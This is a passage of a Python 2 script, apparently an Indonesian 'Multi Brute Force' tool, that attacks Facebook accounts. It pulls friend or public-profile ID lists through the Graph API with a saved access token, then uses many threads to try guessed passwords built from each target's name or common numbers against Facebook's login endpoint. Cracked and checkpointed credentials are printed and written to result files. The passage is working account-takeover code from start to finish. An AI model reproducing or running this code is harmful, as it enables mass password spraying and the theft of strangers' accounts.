                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                cek = open('done/pakis_hindi.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    oke = open('done/pakis_hindi.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    cek = open('done/pakis_hindi.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        oke = open('done/pakis_hindi.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        cek = open('done/pakis_hindi.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = '786786'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            oke = open('done/pakis_hindi.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            cek = open('done/pakis_hindi.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = '786786'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                oke = open('done/pakis_hindi.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                cek = open('done/pakis_hindi.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = '102030'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    oke = open('done/pakis_hindi.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    cek = open('done/pakis_hindi.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = '786786'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        oke = open('done/pakis_hindi.txt', 'a')
                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        cek = open('done/pakis_hindi.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['last_name'].lower() + '786'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            oke = open('done/pakis_hindi.txt', 'a')
                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            cek = open('done/pakis_hindi.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSelesai ...'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSalin hasil crack lalu simpan\x1b[1;91m : \x1b[1;97mdone pakis_hindi.'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m) ')
    os.system('python2 Crackv1.py')


def crack_malay():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print ' '
    print '\x1b[1;91m _________   ________.    '
    print '\x1b[1;97m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
    print '\x1b[1;91m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
    print '\x1b[1;97m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
    print '\x1b[1;91m  \\______  /|__|   |___  /'
    print '\x1b[1;97m         \\/            \\/ '
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[1;97m(\x1b[1;93mMalaysia\x1b[1;97m)\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m(\x1b[1;97m1\x1b[1;94m) \x1b[1;97mCrack Dari Daftar Teman'
    print '\x1b[1;94m(\x1b[1;97m2\x1b[1;94m)\x1b[1;97m Crack Dari Id Teman/Publik'
    print '\x1b[1;94m(\x1b[1;97m3\x1b[1;94m)\x1b[1;97m Crack Dari File'
    print '\x1b[1;94m(\x1b[1;91m0\x1b[1;94m) \x1b[1;97mKembali'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    pilih_malay()


def pilih_malay():
    teak = raw_input('\x1b[1;97m(?) Pilih \x1b[94m> \x1b[1;97m ')
    if teak == '':
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
        pilih_malay()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print ' '
            print '\x1b[1;91m _________   ________.    '
            print '\x1b[1;97m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;91m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;97m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;91m  \\______  /|__|   |___  /'
            print '\x1b[1;97m         \\/            \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;94m>>> \x1b[1;93mCRACK MALAYSIA \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif teak == '2' or teak == '02':
            os.system('clear')
            print ' '
            print '\x1b[1;91m _________   ________.    '
            print '\x1b[1;97m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;91m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;97m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;91m  \\______  /|__|   |___  /'
            print '\x1b[1;97m         \\/            \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;94m>>> \x1b[1;93mCRACK MALAYSIA \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            idt = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) ID Publik \x1b[1;91m:\x1b[1;97m ')
            try:
                pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                sp = json.loads(pok.text)
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama Akun \x1b[1;91m:\x1b[1;97m ' + sp['name']
            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) ID publik Tidak Ada!'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_malay()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Tidak ada koneksi !'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '3' or teak == '03':
            os.system('clear')
            print ' '
            print '\x1b[1;91m _________   ________.    '
            print '\x1b[1;97m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;91m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;97m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;91m  \\______  /|__|   |___  /'
            print '\x1b[1;97m         \\/            \\/ '
            try:
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                print '             \x1b[1;94m>>> \x1b[1;93mCRACK MALAYSIA \x1b[1;94m<<<'
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                idlist = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mNama File\x1b[1;91m :\x1b[1;97m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada ! '
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali \x1b[1;97m)')
            except IOError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada !'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_malay()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
            pilih_malay()
        print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Total ID\x1b[1;91m  :\x1b[1;97m ' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Crack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\x1b[0m'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\x1b[0m'
    print 50 * '\x1b[1;94m\xe2\x94\x80'

    def main(arg):
        zowe = arg
        try:
            sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;97m%H\x1b[1;97m:\x1b[1;97m%M\x1b[1;97m:\x1b[1;97m%S')))
            sys.stdout.flush()
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                oke = open('done/malay.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                cek = open('done/malay.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '123'
